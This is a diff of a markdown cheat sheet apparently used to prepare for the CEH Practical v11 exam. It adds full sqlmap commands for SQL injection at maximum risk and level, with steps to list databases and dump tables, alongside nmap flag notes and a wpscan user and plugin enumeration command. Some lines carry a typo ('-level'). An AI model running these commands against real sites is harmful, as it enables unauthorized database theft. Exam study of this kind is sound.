@@ -24,15 +24,14 @@ I'm Preparing CEH Practical V11. hope it will be help full to all of you guys. I
   -iL = import txt  -oX = output   --top-ports 1000 = UDP 1000 scan   -sU = UDP scan   -sT = TCP scan 
   
 ## SQLmap:
-  
-  for url= -u    for txtfile= -r
-  
+  ```
+  $ sqlmap -u http://site.com?id=1 --cookie="cookies" --risk 3 --level 5 --dbms=mysql --dbs
+  $ sqlmap -u "http://site.com/sqli/?id=1&Submit=Submit" --cookie="cookies1;cookies2" --data="data" --risk 3 -level 5 --dbms=mysql --dbs
+  $ sqlmap -u "http://site.com/sqli/cookies.php" --cookie="cookies1;cookies2" --data="data" -p id --risk 3 -level 5 --dbms=mysql --dbs
   $ sqlmap -r test.txt --batch --risk 3 --level 4 --dbs
-  
   $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename --tables
-  
   $ sqlmap -r test.txt --batch --risk 3 --level 4 -D databasename -T tables name --dump
-
+```
 ## WPscan:
   $ wpscan --url http://test.com --enumerate u --enumerate p
   
